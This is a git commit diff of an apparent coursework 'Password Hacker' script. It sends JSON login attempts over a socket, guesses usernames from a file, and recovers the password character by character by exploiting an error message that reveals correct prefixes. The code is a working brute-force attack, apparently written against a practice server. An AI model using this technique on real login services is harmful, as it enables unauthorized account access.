185f5df8c9c1b01a7b2df3d4bd3f8baf8d829e53
João Righetto <jm_zr@hotmail.com>
2022-12-13 18:38:55 +0000

    Stage 4/5 - Catching exception

--- hack.py
+++ hack.py
@@ -1,37 +1,49 @@
+import json
+import socket
 import string
 import sys
-import socket
-import itertools
 from typing import TextIO
+from _socket import SocketType
 
 
-def brute_force(char_base: list):
-    for i in range(1, 6):
-        for item in list(itertools.product(char_base, repeat=i)):
-            password = ''.join(item)
-            socket.send(password.encode())
-            response = socket.recv(64).decode()
-            if response == "Connection success!":
-                return password
+def brute_force(logins_file: TextIO, socket_obj: SocketType):
+    credentials = find_login(logins_file, socket_obj)
+    success = False
+    while not success:
+        for char in list(string.ascii_letters + string.digits):
+            temp_pw = credentials["password"]
+            temp_pw += char
+            credentials_json = json.dumps({"login": credentials["login"], "password": temp_pw})
+            socket_obj.send(credentials_json.encode())
+            response = socket_obj.recv(1024).decode()
+            if response == '{"result": "Exception happened during login"}':
+                credentials["password"] = temp_pw
+                break
+            elif response == '{"result": "Connection success!"}':
+                credentials["password"] = temp_pw
+                success = True
+                break
+            else:
+                continue
+    return credentials
 
 
-def dict_brute_force(common_passwords: TextIO):
-    for common_password in common_passwords:
-        passwords = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] if letter in string.ascii_lowercase else letter for letter in common_password.strip()))))
-        for password in passwords:
-            socket.send(password.encode())
-            response = socket.recv(64).decode()
-            if response == "Connection success!":
-                return password
+def find_login(logins_file: TextIO, socket_obj: SocketType):
+    credentials = {"login": "", "password": ""}
+    for login in logins_file:
+        credentials["login"] = login.strip()
+        credentials_json = json.dumps(credentials)
+        socket_obj.send(credentials_json.encode())
+        response = socket.recv(1024).decode()
+        if response == '{"result": "Wrong password!"}':
+            return credentials
+        else:
+            continue
 
 
 ip, port = sys.argv[1], int(sys.argv[2])
-chars = list(string.ascii_lowercase + string.digits)
 
-
-with socket.socket() as socket:
+with socket.socket() as socket,\
+        open(r"C:\Users\Joao Marcos\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt", "r") as logins:
     socket.connect((ip, port))
-    # print(brute_force(chars))
-    with open(r"C:\Users\Joao Marcos\PycharmProjects\Password Hacker\Password Hacker\task\passwords.txt", "r") as file:
-        print(dict_brute_force(file))
-
+    print(json.dumps(brute_force(logins, socket)))
